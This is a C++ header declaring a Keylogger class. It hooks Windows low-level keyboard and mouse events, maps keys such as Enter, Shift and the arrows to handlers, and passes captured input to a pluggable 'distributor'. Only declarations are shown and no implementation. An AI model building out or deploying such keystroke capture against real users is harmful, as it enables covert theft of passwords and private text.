#pragma once

#include <string>
#include <map>
#include <functional>
#include <memory>

#include "StaticTools.h"
#include "KeyState.h"
#include "IDistributor.h"

#include "AInputType.h"
#include "InputKeyboard.h"
#include "InputMouse.h"
#include "MouseEvent.h"

#include <Windows.h>
#include <cctype>

class Keylogger
{
public:
	Keylogger(void);
	~Keylogger(void);

	void init(void);
	void keyPressed(LPKBDLLHOOKSTRUCT key);
	void keyReleased(LPKBDLLHOOKSTRUCT key);
	void mouseClick(MouseEvent me,LPMSLLHOOKSTRUCT mouse);

	void setDistributor(std::shared_ptr<IDistributor> distributor);

private:
	std::string key_Enter(KeyState v);
	std::string key_Backspace(KeyState v);
	std::string key_Delete(KeyState v);
	std::string key_Shift(KeyState v);
	std::string key_LShift(KeyState v);
	std::string key_RShift(KeyState v);
	std::string key_Maj(KeyState v);
	std::string key_Left(KeyState v);
	std::string key_Right(KeyState v);
	std::string key_Up(KeyState v);
	std::string key_Down(KeyState v);
	std::map<DWORD, std::function<std::string(KeyState)> > _keys;

	KeyState _maj;
	KeyState _shift;

	std::shared_ptr<IDistributor> _distributor;
};

